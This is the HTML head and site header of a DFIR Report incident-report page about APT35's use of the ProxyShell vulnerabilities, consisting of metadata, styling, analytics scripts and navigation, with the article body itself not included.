<html lang="en-US" class="jetpack-lazy-images-js-enabled" style="transform: none; height: 100%;"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<link rel="profile" href="https://gmpg.org/xfn/11">
<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">

<title>APT35 Automates Initial Access Using ProxyShell</title>
<meta name="description" content="In this intrusion, we observed the initial exploitation of the ProxyShell vulnerabilities followed by some further post-exploitation activity, which included web shells, credential dumping, and specialized payloads.">
<link rel="canonical" href="https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/">
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="APT35 Automates Initial Access Using ProxyShell">
<meta property="og:description" content="In this intrusion, we observed the initial exploitation of the ProxyShell vulnerabilities followed by some further post-exploitation activity, which included web shells, credential dumping, and specialized payloads.">
<meta property="og:url" content="https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/">
<meta property="og:site_name" content="The DFIR Report">
<meta property="article:published_time" content="2022-03-21T01:55:06+00:00">
<meta property="article:modified_time" content="2022-03-21T02:38:43+00:00">
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain.png">
<meta property="og:image:width" content="1673">
<meta property="og:image:height" content="1447">
<meta property="og:image:type" content="image/png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:label1" content="Written by">
<meta name="twitter:data1" content="editor">
<meta name="twitter:label2" content="Est. reading time">
<meta name="twitter:data2" content="17 minutes">
<script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/zLD1nfkNCJC1kEswSRdSyd-p/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-uObFsIlmV0TvXnvnUvEhhDHEbjC4zBHwRA8tg/f0CcVHlIG0XlMAK1oHeK06zBCe"></script><script id="twitter-wjs" src="https://platform.twitter.com/widgets.js"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://thedfirreport.com/#website","url":"https://thedfirreport.com/","name":"The DFIR Report","description":"Real Intrusions by Real Attackers, The Truth Behind the Intrusion","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://thedfirreport.com/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/#primaryimage","inLanguage":"en-US","url":"https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain.png","contentUrl":"https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain.png","width":1673,"height":1447},{"@type":"WebPage","@id":"https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/#webpage","url":"https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/","name":"APT35 Automates Initial Access Using ProxyShell","isPartOf":{"@id":"https://thedfirreport.com/#website"},"primaryImageOfPage":{"@id":"https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/#primaryimage"},"datePublished":"2022-03-21T01:55:06+00:00","dateModified":"2022-03-21T02:38:43+00:00","author":{"@id":"https://thedfirreport.com/#/schema/person/b74bd4df805a2739b85903202f6b5838"},"description":"In this intrusion, we observed the initial exploitation of the ProxyShell vulnerabilities followed by some further post-exploitation activity, which included web shells, credential dumping, and specialized payloads.","breadcrumb":{"@id":"https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/"]}]},{"@type":"BreadcrumbList","@id":"https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://thedfirreport.com/"},{"@type":"ListItem","position":2,"name":"APT35 Automates Initial Access Using ProxyShell"}]},{"@type":"Person","@id":"https://thedfirreport.com/#/schema/person/b74bd4df805a2739b85903202f6b5838","name":"editor","image":{"@type":"ImageObject","@id":"https://thedfirreport.com/#personlogo","inLanguage":"en-US","url":"https://secure.gravatar.com/avatar/9627d3871f13290c26ecf861f7715257?s=96&d=mm&r=g","contentUrl":"https://secure.gravatar.com/avatar/9627d3871f13290c26ecf861f7715257?s=96&d=mm&r=g","caption":"editor"},"sameAs":["https://thedfirreport.com"],"url":"https://thedfirreport.com/author/editor/"}]}</script>

<link rel="dns-prefetch" href="//cdn.jsdelivr.net">
<link rel="dns-prefetch" href="//www.google.com">
<link rel="dns-prefetch" href="//fonts.googleapis.com">
<link rel="dns-prefetch" href="//s.w.org">
<link rel="alternate" type="application/rss+xml" title="The DFIR Report » Feed" href="https://thedfirreport.com/feed/">
<link rel="alternate" type="application/rss+xml" title="The DFIR Report » Comments Feed" href="https://thedfirreport.com/comments/feed/">
<script type="text/javascript">
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.9.1"}};
/*! This file is auto-generated */
!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([10084,65039,8205,55357,56613],[10084,65039,8203,55357,56613])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
</script>
<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 0.07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel="stylesheet" id="wp-block-library-css" href="https://thedfirreport.com/wp-includes/css/dist/block-library/style.min.css?ver=5.9.1" type="text/css" media="all">
<style id="wp-block-library-inline-css" type="text/css">
.has-text-align-justify{text-align:justify;}
</style>
<link rel="stylesheet" id="mediaelement-css" href="https://thedfirreport.com/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css?ver=4.2.16" type="text/css" media="all">
<link rel="stylesheet" id="wp-mediaelement-css" href="https://thedfirreport.com/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=5.9.1" type="text/css" media="all">
<style id="global-styles-inline-css" type="text/css">
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
</style>
<link rel="stylesheet" id="contact-form-7-css" href="https://thedfirreport.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.5.6" type="text/css" media="all">
<link rel="stylesheet" id="freenews-style-css" href="https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=5.9.1" type="text/css" media="all">
<style id="freenews-style-inline-css" type="text/css">
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel="stylesheet" id="font-awesome-css" href="https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/font-awesome.min.css?ver=5.9.1" type="text/css" media="all">
<link rel="stylesheet" id="freenews-google-fonts-css" href="//fonts.googleapis.com/css?family=Heebo:300,400,700|Arimo&amp;subset=latin%2Clatin-ext" type="text/css" media="all">
<link rel="stylesheet" id="social-logos-css" href="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/social-logos/social-logos.min.css?ver=10.7" type="text/css" media="all">
<link rel="stylesheet" id="jetpack_css-css" href="https://thedfirreport.com/wp-content/plugins/jetpack/css/jetpack.css?ver=10.7" type="text/css" media="all">
<script type="text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/build/related-posts/related-posts.min.js?ver=20211209" id="jetpack_related-posts-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-includes/js/jquery/jquery.min.js?ver=3.6.0" id="jquery-core-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/"><link rel="alternate" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/5981"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://thedfirreport.com/wp-includes/wlwmanifest.xml">
<meta name="generator" content="WordPress 5.9.1">
<link rel="shortlink" href="https://thedfirreport.com/?p=5981">
<link rel="alternate" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2022%2F03%2F21%2Fapt35-automates-initial-access-using-proxyshell%2F">
<link rel="alternate" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2022%2F03%2F21%2Fapt35-automates-initial-access-using-proxyshell%2F&amp;format=xml">

<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="text/javascript"></script>
<script type="text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>
<script type="text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=DA95F5FAEB4198E84C6F46B39917262A');
</script><style type="text/css">img#wpstats{display:none}</style>
<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>
<style type="text/css">
				/* If html does not have either class, do not show lazy loaded images. */
				html:not( .jetpack-lazy-images-js-enabled ):not( .js ) .jetpack-lazy-image {
					display: none;
				}
			</style>
<script type="text/javascript">
				document.documentElement.classList.add(
					'jetpack-lazy-images-js-enabled'
				);
			</script>
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32">
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png">
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png">
<script src="https://thedfirreport.com/wp-includes/js/wp-emoji-release.min.js?ver=5.9.1" type="text/javascript" defer=""></script><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><script type="text/javascript" charset="UTF-8" src="https://translate.googleapis.com/_/translate_http/_/js/k=translate_http.tr.lt.5TYz6b5ehWQ.O/am=Ag/d=1/exm=el_conf/ed=1/rs=AN8SPfrGaeD2IiVWB_Ra959FJ_545Rtl9w/m=el_main"></script><style id="theia-sticky-sidebar-stylesheet-TSS">.theiaStickySidebar:after {content: ""; display: table; clear: both;}</style></head>
<body class="post-template-default single single-post postid-5981 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden" style="transform: none; position: relative; min-height: 100%; top: 0px;">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-dark-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 0.49803921568627"></feFuncR><feFuncG type="table" tableValues="0 0.49803921568627"></feFuncG><feFuncB type="table" tableValues="0 0.49803921568627"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 1"></feFuncR><feFuncG type="table" tableValues="0 1"></feFuncG><feFuncB type="table" tableValues="0 1"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.54901960784314 0.98823529411765"></feFuncR><feFuncG type="table" tableValues="0 1"></feFuncG><feFuncB type="table" tableValues="0.71764705882353 0.25490196078431"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-red"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 1"></feFuncR><feFuncG type="table" tableValues="0 0.27843137254902"></feFuncG><feFuncB type="table" tableValues="0.5921568627451 0.27843137254902"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-midnight"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 0"></feFuncR><feFuncG type="table" tableValues="0 0.64705882352941"></feFuncG><feFuncB type="table" tableValues="0 1"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-magenta-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.78039215686275 1"></feFuncR><feFuncG type="table" tableValues="0 0.94901960784314"></feFuncG><feFuncB type="table" tableValues="0.35294117647059 0.47058823529412"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-green"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.65098039215686 0.40392156862745"></feFuncR><feFuncG type="table" tableValues="0 1"></feFuncG><feFuncB type="table" tableValues="0.44705882352941 0.4"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-orange"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.098039215686275 1"></feFuncR><feFuncG type="table" tableValues="0 0.66274509803922"></feFuncG><feFuncB type="table" tableValues="0.84705882352941 0.41960784313725"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><div id="page" class="site" style="transform: none;">
<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
<header id="masthead" class="site-header">
<div id="main-header" class="main-header">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
 <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-3401"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="page_item page-item-24"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
<li class="page_item page-item-2160"><a href="https://thedfirreport.com/services/">Services</a></li>
</ul></div>
</nav>
</div>
</div>
</div>
<div class="main-header-brand">
<div class="header-brand">
<div class="wrap">
<div class="header-brand-content">
<div class="site-branding">
<div class="site-branding-text">
<p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
<p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
</div>
</div>
<div class="header-right">
<div class="header-banner">
</div>
</div>
</div>
</div>
</div>
<div id="nav-sticker-sticky-wrapper" class="sticky-wrapper" style="height: 50px;"><div id="nav-sticker">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<div id="primary-menu" class="menu"><ul aria-expanded="false" class=" nav-menu">
<li class="page_item page-item-3401"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="page_item page-item-24"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
<li class="page_item page-item-2160"><a href="https://thedfirreport.com/services/">Services</a></li>
</ul></div>
</nav>
</div>
</div>
</div>
<div class="clock">
<div id="time">2:52:35 AM</div>
